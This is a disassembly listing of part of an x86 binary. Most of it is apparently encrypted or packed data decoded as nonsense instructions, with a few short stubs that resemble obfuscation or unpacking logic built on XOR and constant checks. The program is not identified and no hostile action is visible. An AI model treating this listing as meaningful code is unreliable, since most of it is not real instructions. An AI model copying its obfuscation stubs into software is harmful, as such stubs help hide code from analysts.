  4081bd:	inc    eax
  4081be:	(bad)  
  4081bf:	sbb    ebp,DWORD PTR [ebp+0x2695fdab]
  4081c5:	(bad)  
  4081c6:	leave  
  4081c7:	cmp    DWORD PTR [eax-0x44],edi
  4081ca:	cmc    
  4081cb:	je     0x40820d
  4081cd:	sbb    BYTE PTR [edx+0x202b0f09],0xb3
  4081d4:	jl     0x40824b
  4081d6:	push   ss
  4081d7:	inc    ecx
  4081d8:	mov    esi,esp
  4081da:	sti    
  4081db:	sbb    ecx,0xffffffca
  4081de:	out    dx,al
  4081df:	dec    edi
  4081e0:	lods   al,BYTE PTR ds:[esi]
  4081e1:	data16 sbb bl,BYTE PTR [esi+eiz*8+0x6ef5bc68]
  4081e9:	mov    ah,0x5d
  4081eb:	rcr    DWORD PTR [edx-0x46],1
  4081ee:	aas    
  4081ef:	pushf  
  4081f0:	cmp    eax,0x9dc1a675
  4081f5:	shl    BYTE PTR ds:0x3943443e,0x5c
  4081fc:	xor    DWORD PTR ds:[ebp-0x4],ebp
  408200:	cli    
  408201:	mov    ds:0x4343eed8,eax
  408206:	xor    cl,BYTE PTR [edx-0x4d]
  408209:	dec    esi
  40820a:	inc    DWORD PTR [edi-0x63]
  40820d:	dec    edx
  40820e:	sub    DWORD PTR [esi+edx*4-0x462eef52],esp
  408215:	int3   
  408216:	pop    ss
  408217:	or     eax,0x82ca725f
  40821c:	aaa    
  40821d:	aam    0x55
  40821f:	add    DWORD PTR [eax],ebp
  408221:	mov    dl,0xb4
  408223:	adc    DWORD PTR [bp+di-0x4cc4],0x83d420c7
  40822c:	xor    ecx,DWORD PTR [esi+0x39]
  40822f:	jl     0x4082ab
  408231:	cwde   
  408232:	mov    al,0xdf
  408234:	cmp    DWORD PTR [ebx+0xd],eax
  408237:	dec    esp
  408238:	popa   
  408239:	bound  ecx,QWORD PTR ds:0x9d6bc07a
  40823f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408240:	or     ebp,ecx
  408242:	stos   BYTE PTR es:[edi],al
  408243:	jnp    0x408230
  408245:	mov    ebp,0x15c3bf25
  40824a:	mov    ebp,DWORD PTR [ecx-0x23]
  40824d:	(bad)  
  40824e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40824f:	xor    BYTE PTR [esi],dl
  408251:	lods   eax,DWORD PTR ds:[esi]
  408252:	adc    BYTE PTR [ecx+0x24368d8f],ch
  408258:	jle    0x408259
  40825a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40825b:	jl     0x40821b
  40825d:	pusha  
  40825e:	icebp  
  40825f:	cmp    ebp,ebp
  408261:	mov    ecx,0x4ce30022
  408266:	sub    al,0xe2
  408268:	mov    ch,0x14
  40826a:	scas   eax,DWORD PTR es:[edi]
  40826b:	pop    esi
  40826c:	outs   dx,DWORD PTR ds:[esi]
  40826d:	adc    al,0x58
  40826f:	mov    ecx,0x3571bedb
  408274:	or     eax,0xf6807408
  408279:	mul    BYTE PTR [eax+0x908af16]
  40827f:	mov    ebp,0x110cd914
  408284:	sbb    DWORD PTR [esi+0x3d],0xffffffbd
  408288:	mov    bl,0x21
  40828a:	push   ebx
  40828b:	add    dh,dl
  40828d:	das    
  40828e:	mov    ecx,0xcf4ed372
  408293:	xchg   BYTE PTR [eax+0x3c],dh
  408296:	fs sahf 
  408298:	in     al,dx
  408299:	and    bh,BYTE PTR [ebp+ebp*2+0x55]
  40829d:	cdq    
  40829e:	mov    ah,0x60
  4082a0:	and    al,0xdc
  4082a2:	in     eax,0xcd
  4082a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082a5:	test   DWORD PTR [ebx],esi
  4082a7:	adc    al,0x2d
  4082a9:	out    dx,eax
  4082aa:	mov    edx,0x2979572
  4082af:	out    dx,al
  4082b0:	and    al,0x34
  4082b2:	int3   
  4082b3:	jg     0x40832a
  4082b5:	inc    esi
  4082b6:	mov    ah,0x3e
  4082b8:	sbb    eax,0x4a7f1071
  4082bd:	adc    edx,DWORD PTR [ecx-0x2d]
  4082c0:	fisub  WORD PTR [ebx+0xf]
  4082c3:	lods   al,BYTE PTR ds:[esi]
  4082c4:	xor    al,0x13
  4082c6:	mov    eax,ds:0xd3055b38
  4082cb:	mov    dh,0xd9
  4082cd:	mov    ds:0xca39a1bc,eax
  4082d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d3:	popf   
  4082d4:	scas   eax,DWORD PTR es:[edi]
  4082d5:	mov    dl,0xc0
  4082d7:	aas    
  4082d8:	das    
  4082d9:	cmp    DWORD PTR [edi],edx
  4082db:	je     0x408327
  4082dd:	sub    DWORD PTR [edx],0xffffff89
  4082e0:	mov    BYTE PTR [edx],0x4
  4082e3:	sbb    bh,dh
  4082e5:	pusha  
  4082e6:	ret    0xa7c
  4082e9:	push   0xffffffdd
  4082eb:	xor    DWORD PTR [edi+0x29],0xfffffffe
  4082ef:	cmp    DWORD PTR [ecx+0x44e5b544],edi
  4082f5:	jb     0x40832c
  4082f7:	fwait
  4082f8:	(bad)  
  4082f9:	mov    edi,0xf4f70ffd
  4082fe:	cmp    DWORD PTR [esi],ebx
  408300:	repz mov bh,bl
  408303:	jne    0x4082b3
  408305:	std    
  408306:	mov    al,ds:0x9659f2
  40830b:	neg    BYTE PTR [eax]
  40830d:	cmp    ebx,DWORD PTR [esi+ecx*4+0x47]
  408311:	push   0x69
  408313:	fcom   DWORD PTR [ecx]
  408315:	sub    BYTE PTR [ecx],cl
  408317:	dec    ebx
  408318:	sahf   
  408319:	pop    ecx
  40831a:	test   al,0x63
  40831c:	adc    eax,0x70775964
  408321:	mov    ah,0xd5
  408323:	or     cl,ch
  408325:	adc    eax,0x74208adc
  40832a:	or     DWORD PTR [edx+eiz*4-0x685142cb],ebp
  408331:	mov    ecx,0xa9d83bc4
  408336:	lods   al,BYTE PTR ds:[esi]
  408337:	fcom   DWORD PTR [ecx+0x101fd311]
  40833d:	aad    0x8
  40833f:	call   0x2453ac4a
  408344:	xor    al,0xb1
  408346:	pushf  
  408347:	inc    ebx
  408348:	mov    ebp,0x160571a3
  40834d:	cmp    ecx,ebp
  40834f:	icebp  
  408350:	mov    ecx,0xd2a070d1
  408355:	js     0x408300
  408357:	push   esp
  408358:	pop    ss
  408359:	jb     0x40835d
  40835b:	dec    esp
  40835c:	dec    esi
  40835d:	std    
  40835e:	loopne 0x40836c
  408360:	mov    WORD PTR [ecx+0x44],?
  408363:	xchg   esi,eax
  408364:	mov    ds:0xa24de87d,eax
  408369:	mov    edx,0x996948d0
  40836e:	pop    edx
  40836f:	lods   eax,DWORD PTR ds:[esi]
  408370:	loope  0x40831f
  408372:	and    ebx,DWORD PTR [ecx]
  408374:	sar    ch,cl
  408376:	pop    ss
  408377:	not    DWORD PTR [ebx+0xfe8b885]
  40837d:	ret    
  40837e:	popf   
  40837f:	adc    BYTE PTR [ebx-0x69],0x2c
  408383:	inc    esi
  408384:	pop    eax
  408385:	mov    esi,DWORD PTR [eax+0x1c24852a]
  40838b:	or     al,0x3a
  40838d:	or     ebp,DWORD PTR [ebp+0x29]
  408390:	pop    ss
  408391:	push   esp
  408392:	or     bh,bl
  408394:	mov    edx,0x9fb74f7d
  408399:	jae    0x4083ad
  40839b:	jnp    0x4083da
  40839d:	int3   
  40839e:	add    bh,ch
  4083a0:	inc    ebx
  4083a1:	outs   dx,DWORD PTR ds:[esi]
  4083a2:	test   ch,0x73
  4083a5:	mov    bl,0x64
  4083a7:	jg     0x408340
  4083a9:	cld    
  4083aa:	mov    ch,0x2b
  4083ac:	dec    ecx
  4083ad:	lods   eax,DWORD PTR ds:[esi]
  4083ae:	mov    bh,0xb4
  4083b0:	inc    esi
  4083b1:	neg    BYTE PTR [edi+0xa]
  4083b4:	or     eax,0xb2a171
  4083b9:	out    dx,al
  4083ba:	mov    ch,0x37
  4083bc:	ins    BYTE PTR es:[edi],dx
  4083bd:	mov    ds:0x9d8dcc10,eax
  4083c2:	mov    ds:0xf96ed0b1,eax
  4083c7:	xlat   BYTE PTR ds:[ebx]
  4083c8:	ficom  WORD PTR [edi]
  4083ca:	jo     0x4083d7
  4083cc:	mov    edi,esp
  4083ce:	sub    cl,0x23
  4083d1:	mov    cl,0xbc
  4083d3:	push   eax
  4083d4:	mov    ecx,0x6f594031
  4083d9:	dec    ecx
  4083da:	cli    
  4083db:	jg     0x4083ec
  4083dd:	retf   0xfe30
  4083e0:	cmp    eax,0x179bc780
  4083e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083e6:	icebp  
  4083e7:	lods   al,BYTE PTR ds:[esi]
  4083e8:	jp     0x408439
  4083ea:	ret    0xda06
  4083ed:	repz out dx,eax
  4083ef:	cli    
  4083f0:	addr16 enter 0x945e,0x9d
  4083f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083f6:	popf   
  4083f7:	jb     0x4083e7
  4083f9:	(bad)  
  4083fb:	imul   eax,esp,0xd387130e
  408401:	sar    DWORD PTR [edx],0xc4
  408404:	in     al,0x2e
  408406:	xlat   BYTE PTR ds:[ebx]
  408407:	pop    edx
  408408:	jecxz  0x4083db
  40840a:	out    0xed,eax
  40840c:	ret    0x3c3b
  40840f:	push   ebp
  408410:	inc    ecx
  408411:	sub    cl,0x2a
  408414:	repnz call 0x6b6c:0xc4179a20
  40841c:	scas   eax,DWORD PTR es:[edi]
  40841d:	or     BYTE PTR [ecx-0x118c5754],bh
  408423:	mov    BYTE PTR [ecx+ecx*2-0x37de7fa3],0xe6
  40842b:	and    DWORD PTR [ebx-0x1f],eax
  40842e:	xchg   esp,eax
  40842f:	not    DWORD PTR [ebx-0x17]
  408432:	(bad)  
  408433:	les    edi,FWORD PTR [edx+0x3c3ab3cc]
  408439:	xchg   ebp,eax
  40843a:	xchg   edx,eax
  40843b:	out    0x33,eax
  40843d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40843e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40843f:	iret   
  408440:	jno    0x408494
  408442:	push   ebx
  408443:	mov    esi,0xc332ddee
  408448:	dec    eax
  408449:	(bad)  
  40844b:	xchg   dh,ch
  40844d:	dec    edi
  40844e:	xchg   edx,eax
  40844f:	fild   QWORD PTR [eax+0x682f6248]
  408455:	aas    
  408456:	pushf  
  408457:	jmp    0x509e:0x28254ee6
  40845e:	cwde   
  40845f:	jae    0x40840c
  408461:	push   cs
  408462:	dec    esi
  408463:	loop   0x4084c5
  408465:	xlat   BYTE PTR ds:[ebx]
  408466:	adc    BYTE PTR [eax+0x56],ah
  408469:	or     eax,0xf1727fdf
  40846e:	outs   dx,BYTE PTR ds:[esi]
  40846f:	mov    ch,0xc2
  408471:	in     eax,dx
  408472:	(bad)  
  408474:	mov    dh,0x63
  408476:	or     al,BYTE PTR [ebp+0x31]
  408479:	shr    DWORD PTR ds:[esi+0x14],cl
  40847d:	pop    eax
  40847e:	jmp    0x408422
  408480:	aad    0x8a
  408482:	pop    eax
  408483:	(bad)
  408486:	add    DWORD PTR [edi],ebp
  408488:	dec    ecx
  408489:	add    DWORD PTR [edx],edx
  40848b:	fcomp  QWORD PTR [esi]
  40848d:	popa   
  40848e:	push   ss
  40848f:	mov    dh,0xf3
  408491:	add    ah,BYTE PTR [eax]
  408493:	popf   
  408494:	fadd   QWORD PTR [ebp+0x66707134]
  40849a:	cld    
  40849b:	jmp    0x28caed82
  4084a0:	jmp    0xed63:0x320308a1
  4084a7:	leave  
  4084a8:	inc    edi
  4084a9:	sti    
  4084aa:	jmp    0x40845d
  4084ac:	mov    fs,WORD PTR ds:0xc5873fbd
  4084b2:	addr16 mov eax,0x5b7f8f55
  4084b8:	sub    BYTE PTR [edx+0x33f8458b],0xc1
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	pop    esi
  40850f:	push   edx
  408510:	inc    ebp
  408511:	(bad)  [edx]
  408513:	fidivr WORD PTR [esp+edi*2-0x29]
  408517:	jns    0x408595
  408519:	jl     0x408553
  40851b:	stos   BYTE PTR es:[edi],al
  40851c:	leave  
  40851d:	mov    ecx,0x30fb5050
  408522:	scas   eax,DWORD PTR es:[edi]
  408523:	jl     0x408552
  408525:	jle    0x4084b3
  408527:	ret    
  408528:	aad    0x17
  40852a:	daa    
  40852b:	in     eax,0x6
  40852d:	push   ss
  40852e:	popa   
  40852f:	sub    eax,0xe6cc364
  408534:	imul   edi,DWORD PTR [edx+0xa],0x4ad2a38
  40853b:	retf   0x77f3
  40853e:	dec    ebp
  40853f:	push   0xeb91870e
  408544:	jl     0x408574
  408546:	mov    bl,0x48
  408548:	retf   
  408549:	call   0x3d45:0xd8be53c4
  408550:	inc    esp
  408551:	fidiv  WORD PTR [ecx]
  408553:	xchg   esp,eax
  408554:	leave  
  408555:	inc    ebx
  408556:	and    bh,BYTE PTR [edx]
  408558:	rcr    esi,1
  40855a:	inc    edi
  40855b:	adc    esp,DWORD PTR [ecx-0x63b7b662]
  408561:	dec    ecx
  408562:	ins    DWORD PTR es:[edi],dx
  408563:	test   BYTE PTR [eax],al
  408565:	lahf   
  408566:	jns    0x40850a
  408568:	xchg   DWORD PTR [ebp+0xc0bbf3a],eax
  40856e:	repz pop ss
  408570:	std    
  408571:	ror    BYTE PTR [ecx+0x1f314297],1
  408577:	mov    bh,BYTE PTR [eax]
  408579:	pushf  
  40857a:	adc    DWORD PTR [ebx],edx
  40857c:	daa    
  40857d:	mov    ebp,0x59e06fa1
  408582:	inc    edi
  408583:	cdq    
  408584:	hlt    
  408585:	iret   
  408586:	xchg   esi,eax
  408587:	mov    ah,0xa0
  408589:	idiv   ch
  40858b:	push   es
  40858c:	add    al,0x94
  40858e:	imul   ebx,DWORD PTR [ebx+0x47],0xffffffad
  408592:	jge    0x4085dc
  408594:	push   es
  408595:	adc    dh,BYTE PTR [edx]
  408597:	lds    ebx,FWORD PTR [esi]
  408599:	das    
  40859a:	jge    0x40852c
  40859c:	xor    al,0xa3
  40859e:	jecxz  0x4085dc
  4085a0:	push   ds
  4085a1:	test   DWORD PTR [edi+0x31],ecx
  4085a4:	retf   
  4085a5:	dec    ebp
  4085a6:	sbb    ah,bh
  4085a8:	ins    BYTE PTR es:[edi],dx
  4085a9:	push   0xffffffcd
  4085ab:	mov    bl,0xc8
  4085ad:	cmp    ebp,0xb524566d
  4085b3:	retf   0xd9a8
  4085b6:	in     eax,0x91
  4085b8:	push   0xdfc5e2b0
  4085bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085be:	push   0x37
  4085c0:	mov    dl,0x49
  4085c2:	push   es
  4085c3:	lds    edx,FWORD PTR [ecx+0x8]
  4085c6:	fstp   QWORD PTR [ecx+0x701d0bee]
  4085cc:	add    DWORD PTR [ecx+0x30],edx
  4085cf:	adc    al,0x5f
  4085d1:	fnstcw WORD PTR [ecx-0x17]
  4085d4:	retf   
  4085d5:	fld    QWORD PTR [eax+0x1e]
  4085d8:	fiadd  WORD PTR [ebp+edi*8+0x7648af13]
  4085df:	popa   
  4085e0:	pop    esp
  4085e1:	dec    ebp
  4085e2:	mov    edi,0x8f32abd8
  4085e7:	or     eax,0x9fda333b
  4085ec:	add    eax,0x9b7983ce
  4085f1:	pop    ebx
  4085f2:	mov    ebp,0x398ea144
  4085f7:	jmp    0x4436dc9d
  4085fc:	mov    bl,0x64
  4085fe:	sub    DWORD PTR [edi+0x583ffe50],edx
  408604:	sub    eax,0xeb82c5c4
  408609:	lods   eax,DWORD PTR ds:[esi]
  40860a:	sub    eax,edx
  40860c:	sbb    eax,0x7c4afb31
  408611:	mov    ecx,0x64005f9f
  408616:	jmp    0x4085c9
  408618:	dec    esp
  408619:	or     ebp,DWORD PTR [esi+edi*4]
  40861c:	cli    
  40861d:	loopne 0x40862f
  40861f:	cs dec esp
  408621:	or     DWORD PTR [edx],0x94d13055
  408627:	lea    edx,[edx]
  408629:	adc    al,0xd1
  40862b:	pop    edi
  40862c:	pop    DWORD PTR [edx*4-0x4dea524e]
  408633:	(bad)  
  408635:	outs   dx,BYTE PTR cs:[esi]
  408637:	ss sub al,0x0
  40863a:	xchg   esi,eax
  40863b:	aaa    
  40863c:	ins    DWORD PTR es:[edi],dx
  40863d:	push   edx
  40863e:	sbb    al,cl
  408640:	outs   dx,BYTE PTR ds:[esi]
  408641:	mov    edx,0x5ac2b881
  408646:	ror    DWORD PTR [esp+ebx*4+0x39],cl
  40864a:	cmc    
  40864b:	cmp    BYTE PTR [ecx],bh
  40864d:	push   ecx
  40864e:	sub    cl,bl
  408650:	into   
  408651:	imul   ecx,esp,0xe8a9d78f
  408657:	rcl    esp,1
  408659:	jo     0x408636
  40865b:	je     0x4086c6
  40865d:	cdq    
  40865e:	mov    ds:0x9766287b,al
  408663:	je     0x408656
  408665:	mov    eax,0x87900dbe
  40866a:	cld    
  40866b:	sub    al,0x72
  40866d:	cdq    
  40866e:	add    dh,dl
  408670:	jp     0x4086a5
  408672:	xor    ecx,eax
  408674:	jae    0x408677
  408676:	ja     0x4086f0
  408678:	(bad)  
  408679:	dec    ebx
  40867a:	xchg   esp,eax
  40867b:	sysenter 
  40867d:	or     cl,BYTE PTR [eax]
  40867f:	pop    edi
  408680:	pop    eax
  408681:	push   0xffffff84
  408683:	sub    ecx,DWORD PTR [esi]
  408685:	cmc    
  408686:	cdq    
  408687:	sbb    dh,BYTE PTR [ecx-0x26abd48e]
  40868d:	cmp    eax,0x7f881e7
  408692:	cmp    eax,0x270062e5
  408697:	sbb    ch,BYTE PTR [edi]
  408699:	stc    
  40869a:	outs   dx,BYTE PTR ds:[esi]
  40869b:	or     al,0x69
  40869d:	mul    DWORD PTR [edi-0x56f9d60a]
  4086a3:	dec    esp
  4086a4:	add    al,0x64
  4086a6:	mov    esp,0x4bcd4cce
  4086ab:	int    0xf2
  4086ad:	mov    esp,fs
  4086af:	and    ah,BYTE PTR [ebx]
  4086b1:	mov    al,ds:0xfa346faa
  4086b6:	pop    es
  4086b7:	popa   
  4086b8:	pop    ecx
  4086b9:	mov    esi,0x9060cd8d
  4086be:	push   ss
  4086bf:	xor    bl,BYTE PTR [ebx+ebp*8+0x4a4847bc]
  4086c6:	jge    0x4086d5
  4086c8:	sti    
  4086c9:	or     DWORD PTR [ebx+0x694f6a66],ebp
  4086cf:	fnstsw WORD PTR [ecx]
  4086d1:	cdq    
  4086d2:	test   BYTE PTR [ebx],bl
  4086d4:	(bad)  
  4086d5:	sahf   
  4086d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d7:	xchg   BYTE PTR [ecx+0x10f63200],dl
  4086dd:	jo     0x40873f
  4086df:	sub    al,0x48
  4086e1:	pop    eax
  4086e2:	shr    DWORD PTR [eax-0x55f93139],0xd1
  4086e9:	xchg   DWORD PTR [ecx],ebp
  4086eb:	mov    edi,0x69104074
  4086f0:	jae    0x408686
  4086f2:	or     eax,0xf66d1632
  4086f7:	and    eax,DWORD PTR [edx+0x314b441]
  4086fd:	or     al,0xfe
  4086ff:	xchg   ecx,eax
  408700:	faddp  st(4),st
  408702:	mov    bh,0xa6
  408704:	xchg   BYTE PTR [edx],ah
  408706:	popa   
  408707:	sbb    bh,BYTE PTR [edx-0x6a67fe14]
  40870d:	mov    esi,0x554734b
  408712:	pusha  
  408713:	neg    dl
  408715:	test   DWORD PTR [edx+ebx*2],edx
  408718:	adc    ebx,DWORD PTR [edx]
  40871a:	adc    BYTE PTR [esp+edx*2+0x40],ah
  40871e:	xor    ch,bl
  408720:	mov    edx,0x2ce493a6
  408725:	outs   dx,DWORD PTR ds:[esi]
  408726:	cmp    cl,BYTE PTR [edx+0x69e3c306]
  40872c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40872d:	test   al,0x7a
  40872f:	in     al,dx
  408730:	ret    0xd430
  408733:	xor    al,0x28
  408735:	pop    esi
  408736:	bound  edx,QWORD PTR [ecx+0x46f8a55e]
  40873c:	hlt    
  40873d:	imul   ebp,ebp,0x526ab137
  408743:	and    bh,BYTE PTR [eax+0x79]
  408746:	ficom  WORD PTR [ebx-0x7da42c1a]
  40874c:	dec    esi
  40874d:	fisttp WORD PTR ds:0xdbf8d69d
  408753:	xchg   ebx,eax
  408754:	cmp    esi,DWORD PTR [eax-0x212697a0]
  40875a:	pop    edi
  40875b:	inc    BYTE PTR [bx+si+0x319d]
  408760:	and    ah,BYTE PTR ds:0xf1d4c543
  408766:	sub    al,BYTE PTR [edx+0x793b4989]
  40876c:	cmp    ch,BYTE PTR [esi]
  40876e:	popa   
  40876f:	enter  0xb11c,0xb1
  408773:	adc    edi,edi
  408775:	xor    al,0x9c
  408777:	inc    esp
  408778:	mov    dl,0x7b
  40877a:	ds leave 
  40877c:	jmp    0xf0b52af9
  408781:	cmp    BYTE PTR [ecx-0x471c92b],0x9a
  408788:	stc    
  408789:	cwde   
  40878a:	mov    al,ds:0x62a6525d
  40878f:	sub    al,0xa8
  408791:	inc    eax
  408792:	int    0x7d
  408794:	jnp    0x4087b4
  408796:	inc    ebp
  408797:	or     DWORD PTR [ecx+0x53386352],ebp
  40879d:	push   0x7d3fd39
  4087a2:	jl     0x408743
  4087a4:	test   DWORD PTR [eax+ebp*4+0x4f],esp
  4087a8:	adc    eax,0xef99885c
  4087ad:	jb     0x408800
  4087af:	push   0xc6f71a70
  4087b4:	test   al,0x62
  4087b6:	repz mov eax,ds:0x628eda5e
  4087bd:	adc    BYTE PTR [ecx-0x2a392cfb],0x34
  4087c4:	(bad)  
  4087c5:	cmp    al,0xb5
  4087c7:	mov    ebx,0x99de4ac0
  4087cc:	and    BYTE PTR ds:0x49032dae,dl
  4087d2:	adc    BYTE PTR [edi-0x51],bl
  4087d5:	xor    ecx,eax
  4087d7:	call   0x929f4515
  4087dc:	jg     0x4087a4
  4087de:	ja     0x408771
  4087e0:	into   
  4087e1:	data16 fisttp QWORD PTR [esi-0x6639281c]
  4087e8:	div    DWORD PTR [ebx-0x57e336bc]
  4087ee:	cld    
  4087ef:	sub    al,0x1f
  4087f1:	outs   dx,DWORD PTR ds:[esi]
  4087f2:	or     esi,DWORD PTR [edi]
  4087f4:	xor    al,BYTE PTR [edx-0x48]
  4087f7:	nop
  4087f8:	inc    esp
  4087f9:	mov    al,0x41
  4087fb:	push   ebp
  4087fc:	ins    BYTE PTR es:[edi],dx
  4087fd:	imul   ebp,DWORD PTR [esi-0x24],0x24
  408801:	bound  eax,QWORD PTR [edx+0x1991bf6a]
  408807:	push   0xffffff9e
  408809:	mov    edi,0xd9052719
  40880e:	fistp  QWORD PTR [edi+0x16ecdaac]
  408814:	push   ss
  408815:	gs call 0xd628357d
  40881b:	jbe    0x408831
  40881d:	hlt    
  40881e:	push   esp
  40881f:	rcl    BYTE PTR [ebp+eiz*2-0x41],1
  408823:	add    al,0x5d
  408825:	sub    esp,esp
  408827:	jnp    0x408854
  408829:	ror    BYTE PTR [edi+0x6f0f54d2],1
  40882f:	pop    ds
  408830:	push   esp
  408831:	jle    0x4087eb
  408833:	add    DWORD PTR [eax+0x20],0xf65fd02f
  40883a:	push   0xb191c191
  40883f:	xchg   ebp,eax
  408840:	in     eax,dx
  408841:	xchg   edx,eax
  408842:	out    0x54,al
  408844:	out    0xbf,al
  408846:	push   0xe18cee13
  40884b:	(bad)  
  40884c:	aam    0x2
  40884e:	sub    eax,0xff8d357f
  408853:	add    esi,DWORD PTR [ebp-0x73f5bad3]
  408859:	add    DWORD PTR [eax+0x2e],edx
  40885c:	mov    bl,dl
  40885e:	test   DWORD PTR [ecx],0xb9ee38c8
  408864:	xlat   BYTE PTR ds:[ebx]
  408865:	jmp    0x7a41:0xf9195e88
  40886c:	outs   dx,BYTE PTR ds:[esi]
  40886d:	xchg   ebx,eax
  40886e:	jecxz  0x408810
  408870:	repz fptan 
  408873:	xor    DWORD PTR [eax],0x2650fa8f
  408879:	jmp    0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0x2
  4088df:	call   0xdbd67ce9
  4088e4:	jl     0x408962
  4088e6:	xlat   BYTE PTR ds:[ebx]
  4088e7:	jns    0x408965
  4088e9:	jl     0x4088b2
  4088eb:	jmp    ebp
  4088ed:	jae    0x408928
  4088ef:	and    eax,0x1f53291
  4088f4:	sbb    DWORD PTR [edi+edi*1],edi
  4088f7:	dec    edx
  4088f8:	inc    eax
  4088f9:	jnp    0x408942
  4088fb:	ss jle 0x4088ad
  4088fe:	shl    ch,cl
  408900:	bound  esi,QWORD PTR ss:[edi+esi*8+0x1e045ecb]
  408908:	test   DWORD PTR [esi-0x7e],eax
  40890b:	icebp  
  40890c:	and    bl,bh
  40890e:	adc    DWORD PTR [ebp+0xd],0xa6f95c7
  408915:	clc    
  408916:	scas   al,BYTE PTR es:[edi]
  408917:	lea    ebx,ds:0x3a60d4b
  40891d:	pusha  
  40891e:	sub    eax,0x7327cd60
  408923:	jbe    0x40891d
  408925:	xor    dh,dh
  408927:	add    al,0xc
  408929:	or     BYTE PTR gs:[edi+0x21],0x9c
  40892e:	adc    esi,DWORD PTR [esi-0x1a7cca44]
  408934:	es mov ah,0xb6
  408937:	push   eax
  408938:	mov    al,0xc8
  40893a:	xchg   esp,eax
  40893b:	cmp    eax,DWORD PTR [ebp+0x1a895257]
  408941:	dec    BYTE PTR [eax+0x5b]
  408944:	test   BYTE PTR [ecx],al
  408946:	loope  0x4089c3
  408948:	(bad)  
  40894a:	dec    eax
  40894b:	sub    dl,bl
  40894d:	sbb    eax,DWORD PTR [ebx+ecx*1+0x4f]
  408951:	jmp    0xbffd50d1
  408956:	adc    BYTE PTR [ecx],0xe5
  408959:	mov    ds:0x2f4b4ea6,al
  40895e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40895f:	imul   ebp,DWORD PTR [ebx],0xffffffbe
  408962:	or     edx,DWORD PTR [esi]
  408964:	fcmove st,st(1)
  408966:	jle    0x408942
  408968:	fs ret 0x600b
  40896c:	mov    es,WORD PTR [ebx]
  40896e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40896f:	int    0x10
  408971:	add    eax,0x8e66d4b6
  408976:	push   es
  408977:	xchg   edx,eax
  408978:	pop    ecx
  408979:	pop    ss
  40897a:	jne    0x408913
  40897c:	mov    ch,0x1c
  40897e:	scas   eax,DWORD PTR es:[edi]
  40897f:	and    eax,0x7b
  408982:	cmp    BYTE PTR [eax+ecx*8],dl
  408985:	test   al,0x40
  408987:	aaa    
  408988:	ja     0x40893d
  40898a:	or     BYTE PTR [ecx],ch
  40898c:	rcr    BYTE PTR ds:0xc786a420,1
  408992:	push   cs
  408993:	sub    DWORD PTR [eax+0x77],esp
  408996:	sbb    bh,0xbe
  408999:	or     BYTE PTR [ebp-0x6fa063ee],ah
  40899f:	int3   
  4089a0:	sbb    al,0xee
  4089a2:	gs mov edi,0xfa5f0f79
  4089a8:	scas   al,BYTE PTR es:[edi]
  4089a9:	bound  edx,QWORD PTR [edx-0x71]
  4089ac:	jle    0x408a17
  4089ae:	test   edi,esi
  4089b0:	sbb    cl,bh
  4089b2:	dec    edx
  4089b3:	jmp    0x17e1f5a8
  4089b8:	popa   
  4089b9:	jmp    0xf774a41c
  4089be:	inc    edi
  4089bf:	pop    ecx
  4089c0:	cwde   
  4089c1:	inc    ecx
  4089c2:	push   es
  4089c3:	mov    DWORD PTR [edx],edx
  4089c5:	and    esp,DWORD PTR [edx-0x3d]
  4089c8:	scas   eax,DWORD PTR es:[edi]
  4089c9:	into   
  4089ca:	out    dx,eax
